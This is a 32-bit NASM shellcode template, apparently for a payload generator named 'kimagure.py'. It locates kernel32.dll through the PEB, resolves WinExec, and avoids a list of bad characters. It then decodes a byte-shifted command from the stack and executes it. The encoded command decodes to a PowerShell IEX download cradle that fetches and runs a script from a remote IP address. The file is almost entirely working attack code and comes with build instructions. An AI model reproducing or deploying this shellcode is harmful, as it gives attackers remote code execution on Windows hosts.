; Boilerplate code for kimagure.py 
; Build as a full on PE
;   nasm -f win32 template.asm -o ki.template.o; ld -mi386pe -o ki.template.exe template.o
; Assemble just the raw shellcode:
;   nasm -f bin template.asm -o ki.template.bin
; You can cat this to the end of the pe32 template for a quick and dirty PE
; BADCHARS = [0x00,0x02,0x03,0x09,0x0A,0x0D,0x20,0x25,0x2E,0x2F]
BITS 32
section .text
global _start
_start: 
; WinExec Setup
  sub  esp,0x18              ; 83ec18     ; Make some room
  xor  esi,esi               ; 31f6       ; NULL
  push esi                   ; 56         ; Push it to end our string "WinExec\0"
  push 0x63                  ; 6a63       ; "c"    Can do that sub [esp+7] trick if needed
  push word 0x6578           ; 66687865   ; "ex" 
  push 0x456e6957            ; 6857696e45 ; "EniW"
  mov  dword [ebp-4], esp    ; 8965fc     ; *pointer to WinExec\0
; TEB/PEB Parsing to get kernel32.dll Base Address
  mov  ebx, [fs:0x30+esi]    ; 648b5e30   ; Get PEB addr, FS holds TEB address
  mov  ebx, [ebx+0xc]        ; 8b5b0c     ; Get addr of PEB_LDR_DATA
  mov  ebx, [ebx+0x14]       ; 8b5b14     ; InMemoryOrderModuleList first entry
  mov  ebx, [ebx]            ; 8b1b       ; Get address of ntdll.dll entry [OV] CheckSum
  mov  ebx, [ebx]            ; 8b1b       ; Get address of kernel32.dll list entry
  mov  ebx, [ebx+0x10]       ; 8b5b10     ; Get kernel32.dll base address 
; Getting the Ordinal Table from kernel32.dll
  mov  [ebp-0x8], ebx        ; 895df8     ; kernel32.dll base address
  mov  eax,dword [ebx+0x3c]  ; 8b433c     ; RVA of PE signature
  add  eax,ebx               ; 01d8       ; PE sig addr = base addr + RVA of PE sig
  mov  eax,dword [eax+0x78]  ; 8b4078     ; RVA of Export Table
  add  eax,ebx               ; 01d8       ; Address of Export Table
  mov  ecx,dword [eax+0x24]  ; 8b4824     ; RVA of Ordinal Table
  add  ecx,ebx               ; 01d9       ; Address of Ordinal Table
  mov  dword [ebp-0xc],ecx   ; 894df4     ; Put on the stack
  xor  ecx,ecx               ; 31c9       ; This is done to..
  inc  ecx                   ; 41         ; ..create a 0x20,..
  shl  ecx,0x5               ; c1e105     ; ..avoiding it as a bad char
  mov  edi,dword [eax+ecx]   ; 8b3c08     ; RVA of Name Pointer Table
  add  edi,ebx               ; 01df       ; Address of Name Pointer Table
  mov  dword [ebp-0x10],edi  ; 897df0     ; Put on the stack
  mov  edx,dword [eax+0x1c]  ; 8b501c     ; RVA of Address Table
  add  edx,ebx               ; 01da       ; Address of Address Table
  mov  dword [ebp-0x14],edx  ; 8955ec     ; Put on the stack
  mov  ebx,dword [eax+0x14]  ; 8b5814     ; Number of exported functions
  xor  eax,eax               ; 31c0       ; EAX will be our entry counter
  mov  edx, dword [ebp - 8]  ; 8b55f8     ; EDX = kernel32.dll base address
;-- Reference to all the variables we saved
; ebp-0x14 *Address Table
; ebp-0x10 *Name Pointer Table
; ebp-0x0C *Ordinal Table
; ebp-0x08 kernel32.dll base addr
; ebp-0x04 *func = "WinExec\0" ; The function name we are running
;-- Finding WinExec
findName:
  mov  edi,dword [ebp-0x10]  ; 8b7df0     ; edi = Address of Name Pointer Table
  mov  esi,dword [ebp-4]     ; 8b75fc     ; esi = "WinExec\x00"
  xor  ecx,ecx               ; 31c9       ; ECX = 0
  cld                        ; fc         ; Clear direction flag 
  mov  edi,dword [edi+eax*4] ; 8b3c87     ; Name Pointer Table entries are 4 bytes,
  add  edi,edx               ; 01d7       ; EDI = NPT addr + kernel32.ddl base addr
  add  cx,0x8                ; 6683c108   ; Length of "WinExec"
  repe cmpsb                 ; f3a6       ; Compare the first 8 bytes in esi and edi
  jz   findAddr              ; 740b       ; Jump if there's a match.
  inc  eax                   ; 40         ; Increment entry counter
  cmp  eax,ebx               ; 39d8       ; Check if the last function was reached
  jb   findName              ; 72e5       ; If not the last one, continue
  ret                        ; c3         ; Used to end the program    
findAddr:
  mov  ecx, [ebp-0xc]        ; 8b4df4     ; ECX = Address of Ordinal Table
  mov  ebx, edx              ; 89d3       ; EBX = kernel32.dll base address
  mov  edx, [ebp-0x14]       ; 8b55ec     ; EDX = Address of Address Table
  mov  ax, [ecx+eax*2]       ; 668b0441   ; AX  = ordinal addr + (ordinal num * 2)
  mov  eax, [edx+eax*4]      ; 8b0482     ; EAX = Addr table addr + (ordinal * 4)
  add  eax,ebx               ; 01d8       ; EAX = WinExec Addr = 
                             ; = kernel32.dll base address + RVA of WinExec
;--- Command Setup -------------------------------------------------------------
  xor  ecx, ecx              ; 31C9       ; Make a zero
  push ecx                   ; 51         ; Push onto the stack 
  mov  ecx, esp              ; 89E1       ; Put stack pointer in ECX to track where the buffer began
;--- This is what kimagure.py will generate for us - encoded command
;-- CUT HERE -----------
  push 0x11113a38
  push 0x4284813f
  push 0x85847685
  push 0x40414941
  push 0x494b423f
  push 0x413f413f
  push 0x48434240
  push 0x404b8185
  push 0x85793839
  push 0x787f7a83
  push 0x85647572
  push 0x807d7f88
  push 0x80553f3a
  push 0x857f767a
  push 0x7d547376
  push 0x683f8576
  push 0x5f318574
  push 0x767b7360
  push 0x3e88765f
  push 0x39316956
  push 0x5a317d7d
  push 0x76798483
  push 0x76888081
;-- CUT HERE -----------
  dec ecx                    ; 49         ; Syncs the stack pointer
  sub ecx, esp               ; 29E1       ; Get the amount of bytes now on the stack for use as esp+offset
decrypt:
  sub BYTE [esp+ecx], 0x11   ; 802C0C11   ; Subtract value from the byte on the stack
  loop decrypt               ; E2FA       ; Loop until ecx is 0
  sub BYTE [esp], 0x11       ; 802C2411   ; Sub from the last byte because the loop exited before it got to it
  mov esi, esp               ; 89E6       ; lpCmdLine
  push 0x5                   ; 6A05       ; uCmdShow - This is the WINDOW_STATE - It's 5 to avoid bad chars, set to something else if needed
  push esi                   ; 56         ; *lpCmdLine
  call eax                   ; FFD0       ; WinExec(LPCSTR lpCmdLine, UINT uCmdShow);
